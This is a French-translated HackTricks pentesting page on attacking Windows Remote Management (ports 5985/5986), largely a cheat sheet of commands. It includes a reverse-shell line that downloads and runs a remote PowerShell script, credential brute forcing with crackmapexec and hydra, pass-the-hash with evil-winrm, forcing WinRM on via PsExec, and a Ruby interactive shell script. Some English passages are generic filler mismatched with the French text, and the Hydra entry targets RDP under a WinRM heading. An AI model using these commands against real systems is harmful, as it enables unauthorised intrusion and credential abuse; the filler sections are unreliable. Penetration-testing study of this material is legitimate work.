# 5985,5986 - Pentesting WinRM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme des primes de bugs cryptographiques.**

**Obtenez des r√©compenses sans d√©lai**\
Les primes HackenProof ne sont lanc√©es que lorsque les clients d√©posent le budget de r√©compense. Vous recevrez la r√©compense apr√®s la v√©rification du bug.

**Acqu√©rez de l'exp√©rience en pentesting web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Ma√Ætrisez la s√©curit√© web3 d√®s ses d√©buts.

**Devenez la l√©gende du hacker web3**\
Gagnez des points de r√©putation avec chaque bug v√©rifi√© et conqu√©rez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) commencez √† gagner gr√¢ce √† vos hacks !

{% embed url="https://hackenproof.com/register" %}

## WinRM

[Windows Remote Management](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx) (WinRM) est un protocole Microsoft qui **permet la gestion √† distance des machines Windows** via HTTP(S) en utilisant SOAP. √Ä l'arri√®re-plan, il utilise WMI, vous pouvez donc le consid√©rer comme une API bas√©e sur HTTP pour WMI.

Si WinRM est activ√© sur la machine, il est trivial d'administrer la machine √† distance depuis PowerShell. En fait, vous pouvez simplement vous connecter √† une session PowerShell √† distance sur la machine (comme si vous utilisiez SSH !)

La mani√®re la plus simple de d√©tecter si WinRM est disponible est de v√©rifier si le port est ouvert. WinRM √©coutera sur l'un des deux ports :

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

Si l'un de ces ports est ouvert, WinRM est configur√© et vous pouvez essayer d'entrer dans une session √† distance.

## **Initialisation de la session WinRM**.

Nous pouvons configurer PowerShell pour fonctionner avec WinRM. Selon la documentation Microsoft, Enable-PSRemoting est une cmdlet qui configure l'ordinateur pour recevoir des commandes PowerShell √† distance. Si nous avons acc√®s √† une invite PowerShell √©lev√©e sur la victime, nous pouvons l'activer et ajouter tous les "attaquants" en tant qu'h√¥tes de confiance. Nous pouvons ex√©cuter les deux commandes suivantes :
```
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Cela ajoute un joker √† la configuration trustedhosts. Soyez prudent quant √† ce que cela implique. _Note: J'ai √©galement d√ª changer le type de r√©seau sur ma machine d'attaque de "Public" √† "Work"._

Vous pouvez √©galement **activer** WinRM **√† distance** _\*\*\_en utilisant \_wmic_:
```
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
### Testez si configur√©

Une fois que la machine d'attaque est configur√©e, utilisez la fonction `Test-WSMan` pour tester si la cible est configur√©e pour WinRM. Vous devriez voir des informations renvoy√©es sur la version du protocole et wsmid :

![](<../.gitbook/assets/image (161) (1).png>)

![](<../.gitbook/assets/image (162).png>)

Dans ce cas, le premier est configur√© et le second ne l'est pas.

### Ex√©cutez une commande

Maintenant, nous pouvons utiliser la commande `Invoke-Command` de PowerShell pour ex√©cuter √† distance une commande sur la cible via WinRM. Pour ex√©cuter √† distance `ipconfig` et voir la sortie :
```
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (163) (1).png>)

Vous pouvez √©galement **ex√©cuter une commande de votre console PS actuelle via** _**Invoke-Command**_. Supposons que vous ayez localement une fonction appel√©e _**enumeration**_ et que vous souhaitez **l'ex√©cuter sur un ordinateur distant**, vous pouvez le faire :
```ruby
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Ex√©cuter un script

To execute a script using WinRM, you can follow these steps:

1. Connect to the target machine using a WinRM client.
2. Use the `Invoke-Command` cmdlet to run the script on the remote machine.

Here is an example of how to execute a script using WinRM:

```powershell
Invoke-Command -ComputerName <target_machine> -ScriptBlock { <script_content> }
```

Replace `<target_machine>` with the IP address or hostname of the target machine, and `<script_content>` with the actual content of your script.

Make sure that the WinRM service is enabled and running on the target machine. You may also need to configure the necessary firewall rules to allow WinRM traffic.

By executing a script remotely using WinRM, you can automate tasks and perform actions on multiple machines simultaneously. This can be useful for managing and maintaining a large number of systems efficiently.
```ruby
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Obtenir un shell invers√©

To get a reverse shell, you need to exploit a vulnerability in the target system and establish a connection back to your machine. This allows you to gain remote access and control over the target system.

Here are the steps to get a reverse shell:

1. Identify a vulnerability: Look for vulnerabilities in the target system that can be exploited to gain remote access. Common vulnerabilities include weak passwords, unpatched software, or misconfigured services.

2. Exploit the vulnerability: Once you have identified a vulnerability, use an exploit to gain control over the target system. This can involve running a malicious script or exploiting a specific vulnerability in a service or application.

3. Set up a listener: On your machine, set up a listener to receive the reverse shell connection. This can be done using tools like Netcat or Metasploit.

4. Establish the reverse shell connection: Once the vulnerability is exploited, the target system will connect back to your machine. This will establish a reverse shell connection, allowing you to interact with the target system's command prompt.

5. Gain remote access: With the reverse shell connection established, you can now execute commands on the target system as if you were physically present. This gives you remote access and control over the target system.

It is important to note that gaining unauthorized access to computer systems is illegal and unethical. The techniques described here should only be used for legitimate purposes, such as penetration testing or securing your own systems. Always ensure you have proper authorization and follow ethical guidelines when conducting any security testing.
```ruby
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Obtenir une session PS

Ou, si vous souhaitez acc√©der directement √† une session PowerShell interactive, utilisez la fonction `Enter-PSSession`:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (164).png>)

**La session s'ex√©cutera dans un nouveau processus (wsmprovhost) √† l'int√©rieur de la "victime"**

### **Forcer l'ouverture de WinRM**

Si vous voulez vraiment utiliser PS Remoting et WinRM mais que la cible n'est pas configur√©e pour cela, vous pouvez "forcer" son activation avec une seule commande. Je ne recommande pas cela, mais si vous voulez vraiment utiliser WinRM ou PSRemoting, vous pouvez le faire de cette mani√®re. Par exemple, en utilisant PSExec :
```
PS C:\tools\SysinternalsSuite> .\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
Maintenant, nous pouvons entrer dans une session PS √† distance sur la victime.

### Sauvegarde et restauration des sessions

Cela **ne fonctionnera pas** si la **langue** est **restreinte** sur l'ordinateur distant.
```ruby
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
Dans ces sessions, vous pouvez charger des scripts PS en utilisant _Invoke-Command_.
```ruby
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Erreurs

Si vous rencontrez l'erreur suivante :

`enter-pssession : La connexion au serveur distant 10.10.10.175 a √©chou√© avec le message d'erreur suivant : Le client WinRM ne peut pas traiter la demande. Si le sch√©ma d'authentification est diff√©rent de Kerberos, ou si l'ordinateur client n'est pas joint √† un domaine, le transport HTTPS doit √™tre utilis√© ou la machine de destination doit √™tre ajout√©e √† la configuration TrustedHosts. Utilisez winrm.cmd pour configurer TrustedHosts. Notez que les ordinateurs de la liste TrustedHosts peuvent ne pas √™tre authentifi√©s. Vous pouvez obtenir plus d'informations √† ce sujet en ex√©cutant la commande suivante : winrm help config. Pour plus d'informations, consultez le sujet d'aide about_Remote_Troubleshooting.`

Essayez ceci sur le client (informations provenant [ici](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)) :
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est le lieu de tous les programmes de primes pour les bugs cryptographiques.**

**Obtenez une r√©compense sans d√©lai**\
Les primes HackenProof ne sont lanc√©es que lorsque leurs clients d√©posent le budget de r√©compense. Vous recevrez la r√©compense apr√®s la v√©rification du bug.

**Acqu√©rez de l'exp√©rience en pentesting web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Ma√Ætrisez la s√©curit√© web3 d√®s ses d√©buts.

**Devenez une l√©gende du hacking web3**\
Gagnez des points de r√©putation avec chaque bug v√©rifi√© et conqu√©rez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez √† gagner gr√¢ce √† vos hacks !

{% embed url="https://hackenproof.com/register" %}

## Connexion WinRM sous Linux

### Brute Force

Attention, le brute-forcing de WinRM peut bloquer les utilisateurs.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### Utilisation d'evil-winrm

Evil-winrm est un outil de pentesting qui permet d'exploiter les vuln√©rabilit√©s de WinRM (Windows Remote Management) pour acc√©der √† distance √† un syst√®me Windows. Il fournit une interface en ligne de commande pour ex√©cuter des commandes et des scripts sur un h√¥te distant.

Pour utiliser evil-winrm, vous devez d'abord installer Ruby et les d√©pendances n√©cessaires. Ensuite, vous pouvez ex√©cuter la commande suivante pour installer evil-winrm :

```
gem install evil-winrm
```

Une fois install√©, vous pouvez utiliser evil-winrm en sp√©cifiant l'adresse IP ou le nom d'h√¥te de la machine cible, ainsi que les informations d'identification valides pour vous connecter. Voici un exemple de commande :

```
evil-winrm -i <adresse_IP> -u <nom_utilisateur> -p <mot_de_passe>
```

Apr√®s vous √™tre connect√© avec succ√®s, vous pouvez ex√©cuter des commandes sur le syst√®me distant, t√©l√©charger ou t√©l√©verser des fichiers, et m√™me ex√©cuter des scripts PowerShell. Evil-winrm facilite l'exploration et l'exploitation des vuln√©rabilit√©s de WinRM lors d'un test de p√©n√©tration.

Il est important de noter que l'utilisation de evil-winrm pour acc√©der √† un syst√®me sans autorisation appropri√©e est ill√©gale et peut entra√Æner des cons√©quences juridiques. Il est essentiel de n'utiliser cet outil que dans le cadre d'un test de p√©n√©tration autoris√© et √©thique.
```ruby
gem install evil-winrm
```
Lisez la **documentation** sur son github: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Pour utiliser evil-winrm pour se connecter √† une **adresse IPv6**, cr√©ez une entr√©e dans le fichier _**/etc/hosts**_ en d√©finissant un **nom de domaine** pour l'adresse IPv6, puis connectez-vous √† ce domaine.

### Transmettre le hash avec evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../.gitbook/assets/image (173).png>)

### Utilisation d'une machine PS-docker

L'utilisation d'une machine PS-docker est une m√©thode pratique pour effectuer des tests de p√©n√©tration sur les services WinRM. Cette approche permet de cr√©er un environnement isol√© o√π vous pouvez ex√©cuter des commandes PowerShell et tester les vuln√©rabilit√©s potentielles de WinRM.

Voici les √©tapes pour utiliser une machine PS-docker :

1. Installez Docker sur votre syst√®me d'exploitation.
2. T√©l√©chargez l'image Docker PS-docker √† partir du r√©f√©rentiel appropri√©.
3. Ex√©cutez la commande suivante pour cr√©er un conteneur √† partir de l'image t√©l√©charg√©e :

```plaintext
docker run -it --name ps-docker ps-docker-image
```

4. Une fois le conteneur cr√©√©, vous pouvez vous y connecter en utilisant la commande suivante :

```plaintext
docker exec -it ps-docker bash
```

5. √Ä partir de l√†, vous pouvez ex√©cuter des commandes PowerShell pour tester les services WinRM.

L'utilisation d'une machine PS-docker offre plusieurs avantages, notamment la facilit√© de configuration, la portabilit√© et l'isolation de l'environnement de test. Cela vous permet de mener des tests de p√©n√©tration de mani√®re efficace et s√©curis√©e.
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Utilisation d'un script ruby

Code extrait d'ici : [https://alamot.github.io/winrm\_shell/](https://alamot.github.io/winrm\_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## R√©f√©rences

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## Commandes automatiques HackTricks
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‚ÄòMySuperSecr3tPass123!‚Äô

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est le lieu de tous les programmes de primes pour les bugs cryptographiques.**

**Obtenez une r√©compense sans d√©lai**\
Les primes HackenProof sont lanc√©es uniquement lorsque leurs clients d√©posent le budget de r√©compense. Vous recevrez la r√©compense apr√®s que le bug soit v√©rifi√©.

**Acqu√©rez de l'exp√©rience en pentesting web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Ma√Ætrisez la s√©curit√© web3 d√®s ses d√©buts.

**Devenez une l√©gende du hacking web3**\
Gagnez des points de r√©putation avec chaque bug v√©rifi√© et conqu√©rez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez √† gagner gr√¢ce √† vos hacks !

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? Ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
